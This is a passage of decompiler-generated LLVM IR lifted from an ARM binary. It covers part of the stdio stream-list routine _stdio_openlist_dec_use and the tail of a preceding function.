  br i1 %v9_14efc, label %dec_label_pc_14f04, label %dec_label_pc_14f1c

dec_label_pc_14f18:                               ; preds = %dec_label_pc_14f04
  %v0_14f18 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14f18, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14f1c

dec_label_pc_14f1c:                               ; preds = %dec_label_pc_14eec, %dec_label_pc_14f04.dec_label_pc_14ef8_crit_edge, %dec_label_pc_14f18
  %v0_14f24 = phi i32 [ %v0_14f18, %dec_label_pc_14f18 ], [ %v2_14ef825, %dec_label_pc_14eec ], [ %v2_14ef8, %dec_label_pc_14f04.dec_label_pc_14ef8_crit_edge ]
  %v1_14f1c = phi i32 [ %v0_14f18, %dec_label_pc_14f18 ], [ %v3_14eec, %dec_label_pc_14eec ], [ %v1_14efc.pre, %dec_label_pc_14f04.dec_label_pc_14ef8_crit_edge ]
  %v3_14f1c = icmp uge i32 %v0_14f24, %v1_14f1c
  store i1 %v3_14f1c, i1* %cpsr_c.global-to-local, align 1
  %v9_14f1c = icmp eq i32 %v0_14f24, %v1_14f1c
  br i1 %v9_14f1c, label %dec_label_pc_14f24, label %dec_label_pc_14f1c.dec_label_pc_14eec_crit_edge

dec_label_pc_14f1c.dec_label_pc_14eec_crit_edge:  ; preds = %dec_label_pc_14f1c
  %v0_14eec.pre = load i32, i32* @r7, align 4
  %v0_14ef4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14eec

dec_label_pc_14f24:                               ; preds = %dec_label_pc_14f1c
  %v2_14f24 = icmp ne i32 %v1_14f1c, 0
  store i1 %v2_14f24, i1* %cpsr_c.global-to-local, align 1
  %v7_14f28 = icmp slt i32 %v1_14f1c, 2
  br i1 %v7_14f28, label %dec_label_pc_14f44, label %dec_label_pc_14f2c

dec_label_pc_14f2c:                               ; preds = %dec_label_pc_14f24
  %v0_14f30 = load i32, i32* %r1.global-to-local, align 4
  %v1_14f30 = add i32 %v0_14f30, 129
  store i32 %v1_14f30, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14f44

dec_label_pc_14f44:                               ; preds = %dec_label_pc_14ed0, %dec_label_pc_14eb4, %dec_label_pc_14f2c, %dec_label_pc_14f24
  %v0_14f44 = load i32, i32* %r8.global-to-local, align 4
  %v2_14f48 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_14f48, i32* %r4.global-to-local, align 4
  store i32 %v6_14e34, i32* @r5, align 4
  store i32 %v9_14e34, i32* @r6, align 4
  store i32 %v12_14e34, i32* @r7, align 4
  store i32 %v15_14e34, i32* @r8, align 4
  store i32 %v24_14e34, i32* @lr, align 4
  ret i32 %v0_14f44

; uselistorder directives
  uselistorder i32 %v0_14f18, { 1, 0, 2 }
  uselistorder i32 %v1_14efc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_14eb8, { 1, 0 }
  uselistorder i32 %v0_14ebc, { 1, 0 }
  uselistorder i32 %v1_14e78.pre, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 11, 4, 5, 6, 7, 9, 8, 12, 10 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 9, 10, 3, 4, 5, 6, 11, 12, 7, 8 }
  uselistorder i32 %arg3, { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_14f44, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_14f1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14f04, { 1, 0 }
  uselistorder label %dec_label_pc_14eb4, { 1, 0 }
  uselistorder label %dec_label_pc_14ea8, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_14e98, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14e80, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14f50 = load i32, i32* @r4, align 4
  store i32 %v3_14f50, i32* %stack_var_-20, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r5.global-to-local, align 4
  %v4_14f60 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 160) to i32*), align 4
  store i32 %v4_14f60, i32* %r7.global-to-local, align 4
  %v0_14f64 = call i32 @__aeabi_read_tp()
  store i32 %v0_14f64, i32* %r0.global-to-local, align 4
  %v1_14f68 = add i32 %v4_14f60, 8
  %v2_14f68 = inttoptr i32 %v1_14f68 to i32*
  %v3_14f68 = load i32, i32* %v2_14f68, align 4
  store i32 %v3_14f68, i32* %r3.global-to-local, align 4
  %v1_14f6c = add i32 %v0_14f64, -1168
  store i32 %v1_14f6c, i32* %r6.global-to-local, align 4
  %v3_14f70 = icmp uge i32 %v3_14f68, %v1_14f6c
  store i1 %v3_14f70, i1* %cpsr_c.global-to-local, align 1
  %v9_14f70 = icmp eq i32 %v3_14f68, %v1_14f6c
  br i1 %v9_14f70, label %dec_label_pc_14fbc, label %dec_label_pc_14f7c

dec_label_pc_14f7c:                               ; preds = %entry
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_14f60, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_14f8893 = inttoptr i32 %v4_14f60 to i32*
  %v2_14f8894 = load i32, i32* %v1_14f8893, align 4
  store i32 %v2_14f8894, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14f8c96 = icmp eq i32 %v2_14f8894, 0
  br i1 %v9_14f8c96, label %dec_label_pc_14f94, label %dec_label_pc_14fac

dec_label_pc_14f94:                               ; preds = %dec_label_pc_14f7c, %dec_label_pc_14f94.dec_label_pc_14f88_crit_edge
  %v0_14f9497 = phi i32 [ %v1_14f8c.pre, %dec_label_pc_14f94.dec_label_pc_14f88_crit_edge ], [ 0, %dec_label_pc_14f7c ]
  store i32 %v0_14f9497, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14fa4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14fa4, label %dec_label_pc_14fa8, label %dec_label_pc_14f94.dec_label_pc_14f88_crit_edge

dec_label_pc_14f94.dec_label_pc_14f88_crit_edge:  ; preds = %dec_label_pc_14f94
  %v0_14f88.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14f8c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14f88 = inttoptr i32 %v0_14f88.pre to i32*
  %v2_14f88 = load i32, i32* %v1_14f88, align 4
  store i32 %v2_14f88, i32* %r3.global-to-local, align 4
  %v3_14f8c = icmp uge i32 %v2_14f88, %v1_14f8c.pre
  store i1 %v3_14f8c, i1* %cpsr_c.global-to-local, align 1
  %v9_14f8c = icmp eq i32 %v2_14f88, %v1_14f8c.pre
  br i1 %v9_14f8c, label %dec_label_pc_14f94, label %dec_label_pc_14fac

dec_label_pc_14fa8:                               ; preds = %dec_label_pc_14f94
  %v0_14fa8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14fa8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14fac

dec_label_pc_14fac:                               ; preds = %dec_label_pc_14f7c, %dec_label_pc_14f94.dec_label_pc_14f88_crit_edge, %dec_label_pc_14fa8
  %v0_14fac = phi i32 [ %v0_14fa8, %dec_label_pc_14fa8 ], [ %v2_14f8894, %dec_label_pc_14f7c ], [ %v2_14f88, %dec_label_pc_14f94.dec_label_pc_14f88_crit_edge ]
  %v1_14fac = phi i32 [ %v0_14fa8, %dec_label_pc_14fa8 ], [ 0, %dec_label_pc_14f7c ], [ %v1_14f8c.pre, %dec_label_pc_14f94.dec_label_pc_14f88_crit_edge ]
  %v3_14fac = icmp uge i32 %v0_14fac, %v1_14fac
  store i1 %v3_14fac, i1* %cpsr_c.global-to-local, align 1
  %v9_14fac = icmp eq i32 %v0_14fac, %v1_14fac
  br i1 %v9_14fac, label %bb45, label %bb

bb:                                               ; preds = %dec_label_pc_14fac
  %v1_14fb0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_14fb0, i32* %r0.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_14fac, %bb
  %v1_14fb4 = xor i1 %v9_14fac, true
  call void @__pseudo_cond_branch(i1 %v1_14fb4, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_14fb8 = load i32, i32* %r6.global-to-local, align 4
  %v1_14fb8 = load i32, i32* %r7.global-to-local, align 4
  %v2_14fb8 = add i32 %v1_14fb8, 8
  %v3_14fb8 = inttoptr i32 %v2_14fb8 to i32*
  store i32 %v0_14fb8, i32* %v3_14fb8, align 4
  br label %dec_label_pc_14fbc

dec_label_pc_14fbc:                               ; preds = %entry, %bb45
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_14fc0 = load i32, i32* %r5.global-to-local, align 4
  %v2_14fc0 = add i32 %v0_14fc0, 160
  %v3_14fc0 = inttoptr i32 %v2_14fc0 to i32*
  %v4_14fc0 = load i32, i32* %v3_14fc0, align 4
  store i32 %v4_14fc0, i32* %r2.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_14fc8 = add i32 %v0_14fc0, 12
  %v3_14fc8 = inttoptr i32 %v2_14fc8 to i32*
  %v4_14fc8 = load i32, i32* %v3_14fc8, align 4
  store i32 %v4_14fc8, i32* %r3.global-to-local, align 4
  %v1_14fcc = inttoptr i32 %v4_14fc8 to i32*
  %v2_14fcc = load i32, i32* %v1_14fcc, align 4
  store i32 %v2_14fcc, i32* %r1.global-to-local, align 4
  %v1_14fd0 = add i32 %v4_14fc0, 4
  %v2_14fd0 = inttoptr i32 %v1_14fd0 to i32*
  %v3_14fd0 = load i32, i32* %v2_14fd0, align 4
  %v2_14fd4 = icmp ne i32 %v2_14fcc, 0
  store i1 %v2_14fd4, i1* %cpsr_c.global-to-local, align 1
  %v7_14fd4 = icmp eq i32 %v2_14fcc, 1
  %v1_14fd8 = add i32 %v3_14fd0, 1
  store i32 %v1_14fd8, i32* %r3.global-to-local, align 4
  store i32 %v1_14fd8, i32* %v2_14fd0, align 4
  br i1 %v7_14fd4, label %dec_label_pc_14fe4, label %dec_label_pc_15148

dec_label_pc_14fe4:                               ; preds = %dec_label_pc_14fbc
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_14fe8 = load i32, i32* %r5.global-to-local, align 4
  %v2_14fe8 = add i32 %v0_14fe8, 80
  %v3_14fe8 = inttoptr i32 %v2_14fe8 to i32*
  %v4_14fe8 = load i32, i32* %v3_14fe8, align 4
  store i32 %v4_14fe8, i32* %r3.global-to-local, align 4
  %v1_14fec = inttoptr i32 %v4_14fe8 to i32*
  %v2_14fec = load i32, i32* %v1_14fec, align 4
  store i32 %v2_14fec, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp46 = icmp slt i32 %v2_14fec, 1
  br i1 %tmp46, label %dec_label_pc_15148, label %dec_label_pc_14ff8

dec_label_pc_14ff8:                               ; preds = %dec_label_pc_14fe4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_14ffc = add i32 %v0_14fe8, 152
  %v3_14ffc = inttoptr i32 %v2_14ffc to i32*
  %v4_14ffc = load i32, i32* %v3_14ffc, align 4
  store i32 %v4_14ffc, i32* %r7.global-to-local, align 4
  %v1_15000 = add i32 %v4_14ffc, 8
  %v2_15000 = inttoptr i32 %v1_15000 to i32*
  %v3_15000 = load i32, i32* %v2_15000, align 4
  store i32 %v3_15000, i32* %r3.global-to-local, align 4
  %v1_15004 = load i32, i32* %r6.global-to-local, align 4
  %v3_15004 = icmp uge i32 %v3_15000, %v1_15004
  store i1 %v3_15004, i1* %cpsr_c.global-to-local, align 1
  %v9_15004 = icmp eq i32 %v3_15000, %v1_15004
  br i1 %v9_15004, label %dec_label_pc_15048, label %dec_label_pc_1500c

dec_label_pc_1500c:                               ; preds = %dec_label_pc_14ff8
  store i32 %v4_14ffc, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_1501486 = inttoptr i32 %v4_14ffc to i32*
  %v2_1501487 = load i32, i32* %v1_1501486, align 4
  store i32 %v2_1501487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1501889 = icmp eq i32 %v2_1501487, 0
  br i1 %v9_1501889, label %dec_label_pc_15020, label %dec_label_pc_15038

dec_label_pc_15020:                               ; preds = %dec_label_pc_1500c, %dec_label_pc_15020.dec_label_pc_15014_crit_edge
  %v0_1502090 = phi i32 [ %v1_15018.pre, %dec_label_pc_15020.dec_label_pc_15014_crit_edge ], [ 0, %dec_label_pc_1500c ]
  store i32 %v0_1502090, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15030 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15030, label %dec_label_pc_15034, label %dec_label_pc_15020.dec_label_pc_15014_crit_edge

dec_label_pc_15020.dec_label_pc_15014_crit_edge:  ; preds = %dec_label_pc_15020
  %v0_15014.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15018.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15014 = inttoptr i32 %v0_15014.pre to i32*
  %v2_15014 = load i32, i32* %v1_15014, align 4
  store i32 %v2_15014, i32* %r3.global-to-local, align 4
  %v3_15018 = icmp uge i32 %v2_15014, %v1_15018.pre
  store i1 %v3_15018, i1* %cpsr_c.global-to-local, align 1
  %v9_15018 = icmp eq i32 %v2_15014, %v1_15018.pre
  br i1 %v9_15018, label %dec_label_pc_15020, label %dec_label_pc_15038

dec_label_pc_15034:                               ; preds = %dec_label_pc_15020
  %v0_15034 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15034, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15038

dec_label_pc_15038:                               ; preds = %dec_label_pc_1500c, %dec_label_pc_15020.dec_label_pc_15014_crit_edge, %dec_label_pc_15034
  %v0_15038 = phi i32 [ %v0_15034, %dec_label_pc_15034 ], [ %v2_1501487, %dec_label_pc_1500c ], [ %v2_15014, %dec_label_pc_15020.dec_label_pc_15014_crit_edge ]
  %v1_15038 = phi i32 [ %v0_15034, %dec_label_pc_15034 ], [ 0, %dec_label_pc_1500c ], [ %v1_15018.pre, %dec_label_pc_15020.dec_label_pc_15014_crit_edge ]
  %v3_15038 = icmp uge i32 %v0_15038, %v1_15038
  store i1 %v3_15038, i1* %cpsr_c.global-to-local, align 1
  %v9_15038 = icmp eq i32 %v0_15038, %v1_15038
  br i1 %v9_15038, label %bb48, label %bb47

bb47:                                             ; preds = %dec_label_pc_15038
  %v1_1503c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1503c, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_15038, %bb47
  %v1_15040 = xor i1 %v9_15038, true
  call void @__pseudo_cond_branch(i1 %v1_15040, i32 ptrtoint (i32* @global_var_12a80.726 to i32))
  %v0_15044 = load i32, i32* %r6.global-to-local, align 4
  %v1_15044 = load i32, i32* %r7.global-to-local, align 4
  %v2_15044 = add i32 %v1_15044, 8
  %v3_15044 = inttoptr i32 %v2_15044 to i32*
  store i32 %v0_15044, i32* %v3_15044, align 4
  %v0_15050.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15048

dec_label_pc_15048:                               ; preds = %dec_label_pc_14ff8, %bb48
  %v0_15050 = phi i32 [ %v0_14fe8, %dec_label_pc_14ff8 ], [ %v0_15050.pre, %bb48 ]
  store i32 152, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r1.global-to-local, align 4
  %v2_15050 = add i32 %v0_15050, 152
  %v3_15050 = inttoptr i32 %v2_15050 to i32*
  %v4_15050 = load i32, i32* %v3_15050, align 4
  store i32 %v4_15050, i32* %r0.global-to-local, align 4
  %v2_15054 = add i32 %v0_15050, 76
  %v3_15054 = inttoptr i32 %v2_15054 to i32*
  %v4_15054 = load i32, i32* %v3_15054, align 4
  store i32 %v4_15054, i32* %r2.global-to-local, align 4
  %v1_15058 = add i32 %v4_15050, 4
  %v2_15058 = inttoptr i32 %v1_15058 to i32*
  %v3_15058 = load i32, i32* %v2_15058, align 4
  store i32 %v3_15058, i32* %r3.global-to-local, align 4
  %v1_1505c = inttoptr i32 %v4_15054 to i32*
  %v2_1505c = load i32, i32* %v1_1505c, align 4
  store i32 %v2_1505c, i32* %r2.global-to-local, align 4
  %v1_15060 = add i32 %v3_15058, 1
  store i32 %v1_15060, i32* %r3.global-to-local, align 4
  store i32 76, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v1_15060, i32* %v2_15058, align 4
  %v0_150b0.pr = load i32, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150b011 = icmp eq i32 %v0_150b0.pr, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_150b011, label %dec_label_pc_150bc, label %dec_label_pc_15074

dec_label_pc_15074:                               ; preds = %dec_label_pc_15048, %dec_label_pc_150ac
  %v0_150982 = phi i32 [ %v0_150ac, %dec_label_pc_150ac ], [ %v0_150b0.pr, %dec_label_pc_15048 ]
  %v1_15074 = inttoptr i32 %v0_150982 to i16*
  %v2_15074 = load i16, i16* %v1_15074, align 2
  %v3_15074 = zext i16 %v2_15074 to i32
  store i32 %v3_15074, i32* %r3.global-to-local, align 4
  %v2_15078 = and i32 %v3_15074, 32816
  store i32 %v2_15078, i32* %r1.global-to-local, align 4
  %v2_1507c = icmp ugt i32 %v2_15078, 47
  store i1 %v2_1507c, i1* %cpsr_c.global-to-local, align 1
  %v7_1507c = icmp eq i32 %v2_15078, 48
  %v1_15080 = add i32 %v0_150982, 32
  %v2_15080 = inttoptr i32 %v1_15080 to i32*
  %v3_15080 = load i32, i32* %v2_15080, align 4
  store i32 %v3_15080, i32* %r4.global-to-local, align 4
  br i1 %v7_1507c, label %dec_label_pc_1508c, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_15074
  store i32 %v0_150982, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150ac

dec_label_pc_1508c:                               ; preds = %dec_label_pc_15074
  %v0_1508c = load i32, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1508c = icmp eq i32 %v0_1508c, 0
  br i1 %v2_1508c, label %.thread, label %bb49

.thread:                                          ; preds = %dec_label_pc_1508c
  %v1_15090 = load i32, i32* %r5.global-to-local, align 4
  %v2_15090 = load i32, i32* %r7.global-to-local, align 4
  %v3_15090 = add i32 %v2_15090, %v1_15090
  %v4_15090 = inttoptr i32 %v3_15090 to i32*
  %v5_15090 = load i32, i32* %v4_15090, align 4
  store i32 %v5_15090, i32* %r3.global-to-local, align 4
  %v3_15094 = inttoptr i32 %v5_15090 to i32*
  store i32 %v3_15080, i32* %v3_15094, align 4
  %v0_15098 = load i32, i32* %r2.global-to-local, align 4
  %v1_15098 = inttoptr i32 %v0_15098 to i16*
  %v2_15098 = load i16, i16* %v1_15098, align 2
  %v3_15098 = zext i16 %v2_15098 to i32
  store i32 %v3_15098, i32* %r3.global-to-local, align 4
  br label %bb50

bb49:                                             ; preds = %dec_label_pc_1508c
  %v2_150988 = load i16, i16* %v1_15074, align 2
  %v3_150989 = zext i16 %v2_150988 to i32
  store i32 %v3_150989, i32* %r3.global-to-local, align 4
  %v3_1509c = add i32 %v0_1508c, 32
  %v4_1509c = inttoptr i32 %v3_1509c to i32*
  store i32 %v3_15080, i32* %v4_1509c, align 4
  %v0_150a0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %.thread, %bb49
  %v0_150a0 = phi i32 [ %v3_15098, %.thread ], [ %v0_150a0.pre, %bb49 ]
  %v1_150a0 = and i32 %v0_150a0, 8192
  %v2_150a0 = icmp eq i32 %v1_150a0, 0
  br i1 %v2_150a0, label %bb52, label %bb51

bb51:                                             ; preds = %bb50
  %v1_150a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_150a4, i32* %r0.global-to-local, align 4
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v1_150a8 = xor i1 %v2_150a0, true
  call void @__pseudo_cond_branch(i1 %v1_150a8, i32 ptrtoint (i32* @global_var_11adc.29 to i32))
  %v0_150ac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_150ac

dec_label_pc_150ac:                               ; preds = %.thread38, %bb52
  %v0_150ac = phi i32 [ %v0_150ac.pre, %bb52 ], [ %v3_15080, %.thread38 ]
  store i32 %v0_150ac, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150b0 = icmp eq i32 %v0_150ac, 0
  store i32 32816, i32* %r1.global-to-local, align 4
  br i1 %v2_150b0, label %dec_label_pc_150bc, label %dec_label_pc_15074

dec_label_pc_150bc:                               ; preds = %dec_label_pc_150ac, %dec_label_pc_15048
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_150c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_150c0 = add i32 %v0_150c0, 152
  %v3_150c0 = inttoptr i32 %v2_150c0 to i32*
  %v4_150c0 = load i32, i32* %v3_150c0, align 4
  store i32 %v4_150c0, i32* %r0.global-to-local, align 4
  %v1_150c4 = add i32 %v4_150c0, 4
  %v2_150c4 = inttoptr i32 %v1_150c4 to i32*
  %v3_150c4 = load i32, i32* %v2_150c4, align 4
  %v1_150c8 = add i32 %v3_150c4, -1
  store i32 %v1_150c8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_150cc = icmp eq i32 %v1_150c8, 0
  store i32 %v1_150c8, i32* %v2_150c4, align 4
  br i1 %v2_150cc, label %dec_label_pc_150d8, label %dec_label_pc_15138

dec_label_pc_150d8:                               ; preds = %dec_label_pc_150bc
  %v0_150d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_150d8 = load i32, i32* %r0.global-to-local, align 4
  %v2_150d8 = add i32 %v1_150d8, 8
  %v3_150d8 = inttoptr i32 %v2_150d8 to i32*
  store i32 %v0_150d8, i32* %v3_150d8, align 4
  %v0_150dc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_150dc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_150e0

dec_label_pc_150e0:                               ; preds = %dec_label_pc_15110.dec_label_pc_150e0_crit_edge, %dec_label_pc_150d8
  %v0_150e0 = phi i32 [ %v0_150e0.pre, %dec_label_pc_15110.dec_label_pc_150e0_crit_edge ], [ %v0_150dc, %dec_label_pc_150d8 ]
  %v1_150e0 = inttoptr i32 %v0_150e0 to i32*
  %v2_150e0 = load i32, i32* %v1_150e0, align 4
  store i32 %v2_150e0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_150e0, i32* %r2.global-to-local, align 4
  %v2_150ec74 = load i32, i32* %v1_150e0, align 4
  store i32 %v2_150ec74, i32* %r3.global-to-local, align 4
  %v3_150f076 = icmp uge i32 %v2_150ec74, %v2_150e0
  store i1 %v3_150f076, i1* %cpsr_c.global-to-local, align 1
  %v9_150f082 = icmp eq i32 %v2_150ec74, %v2_150e0
  br i1 %v9_150f082, label %dec_label_pc_150f8, label %dec_label_pc_15110

dec_label_pc_150f8:                               ; preds = %dec_label_pc_150e0, %dec_label_pc_150f8.dec_label_pc_150ec_crit_edge
  %v0_150f883 = phi i32 [ %v1_150f0.pre, %dec_label_pc_150f8.dec_label_pc_150ec_crit_edge ], [ %v2_150e0, %dec_label_pc_150e0 ]
  store i32 %v0_150f883, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15108 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15108, label %dec_label_pc_1510c, label %dec_label_pc_150f8.dec_label_pc_150ec_crit_edge

dec_label_pc_150f8.dec_label_pc_150ec_crit_edge:  ; preds = %dec_label_pc_150f8
  %v0_150ec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_150f0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_150ec = inttoptr i32 %v0_150ec.pre to i32*
  %v2_150ec = load i32, i32* %v1_150ec, align 4
  store i32 %v2_150ec, i32* %r3.global-to-local, align 4
  %v3_150f0 = icmp uge i32 %v2_150ec, %v1_150f0.pre
  store i1 %v3_150f0, i1* %cpsr_c.global-to-local, align 1
  %v9_150f0 = icmp eq i32 %v2_150ec, %v1_150f0.pre
  br i1 %v9_150f0, label %dec_label_pc_150f8, label %dec_label_pc_15110

dec_label_pc_1510c:                               ; preds = %dec_label_pc_150f8
  %v0_1510c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1510c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15110

dec_label_pc_15110:                               ; preds = %dec_label_pc_150e0, %dec_label_pc_150f8.dec_label_pc_150ec_crit_edge, %dec_label_pc_1510c
  %v0_15118 = phi i32 [ %v0_1510c, %dec_label_pc_1510c ], [ %v2_150ec74, %dec_label_pc_150e0 ], [ %v2_150ec, %dec_label_pc_150f8.dec_label_pc_150ec_crit_edge ]
  %v1_15110 = phi i32 [ %v0_1510c, %dec_label_pc_1510c ], [ %v2_150e0, %dec_label_pc_150e0 ], [ %v1_150f0.pre, %dec_label_pc_150f8.dec_label_pc_150ec_crit_edge ]
  %v3_15110 = icmp uge i32 %v0_15118, %v1_15110
  store i1 %v3_15110, i1* %cpsr_c.global-to-local, align 1
  %v9_15110 = icmp eq i32 %v0_15118, %v1_15110
  br i1 %v9_15110, label %dec_label_pc_15118, label %dec_label_pc_15110.dec_label_pc_150e0_crit_edge

dec_label_pc_15110.dec_label_pc_150e0_crit_edge:  ; preds = %dec_label_pc_15110
  %v0_150e0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_150e0

dec_label_pc_15118:                               ; preds = %dec_label_pc_15110
  %v2_15118 = icmp ne i32 %v1_15110, 0
  store i1 %v2_15118, i1* %cpsr_c.global-to-local, align 1
  %v7_1511c = icmp slt i32 %v1_15110, 2
  br i1 %v7_1511c, label %dec_label_pc_15138, label %dec_label_pc_15120

dec_label_pc_15120:                               ; preds = %dec_label_pc_15118
  %v0_15120 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15120, i32* %r0.global-to-local, align 4
  %v0_15124 = load i32, i32* %r1.global-to-local, align 4
  %v1_15124 = add i32 %v0_15124, 129
  store i32 %v1_15124, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15138

dec_label_pc_15138:                               ; preds = %dec_label_pc_150bc, %dec_label_pc_15120, %dec_label_pc_15118
  store i32 80, i32* %r3.global-to-local, align 4
  %v0_1513c = load i32, i32* %r5.global-to-local, align 4
  %v2_1513c = add i32 %v0_1513c, 80
  %v3_1513c = inttoptr i32 %v2_1513c to i32*
  %v4_1513c = load i32, i32* %v3_1513c, align 4
  store i32 %v4_1513c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_15144 = inttoptr i32 %v4_1513c to i32*
  store i32 0, i32* %v2_15144, align 4
  br label %dec_label_pc_15148

dec_label_pc_15148:                               ; preds = %dec_label_pc_14fbc, %dec_label_pc_14fe4, %dec_label_pc_15138
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1514c = load i32, i32* %r5.global-to-local, align 4
  %v2_1514c = add i32 %v0_1514c, 160
  %v3_1514c = inttoptr i32 %v2_1514c to i32*
  %v4_1514c = load i32, i32* %v3_1514c, align 4
  store i32 %v4_1514c, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_15154 = add i32 %v0_1514c, 12
  %v3_15154 = inttoptr i32 %v2_15154 to i32*
  %v4_15154 = load i32, i32* %v3_15154, align 4
  store i32 %v4_15154, i32* %r1.global-to-local, align 4
  %v1_15158 = add i32 %v4_1514c, 4
  %v2_15158 = inttoptr i32 %v1_15158 to i32*
  %v3_15158 = load i32, i32* %v2_15158, align 4
  store i32 %v3_15158, i32* %r2.global-to-local, align 4
  %v1_1515c = inttoptr i32 %v4_15154 to i32*
  %v2_1515c = load i32, i32* %v1_1515c, align 4
  %v1_15160 = add i32 %v3_15158, -1
  store i32 %v1_15160, i32* %r2.global-to-local, align 4
  %v1_15164 = add i32 %v2_1515c, -1
  store i32 %v1_15164, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15168 = icmp eq i32 %v1_15160, 0
  store i32 %v1_15164, i32* %v1_1515c, align 4
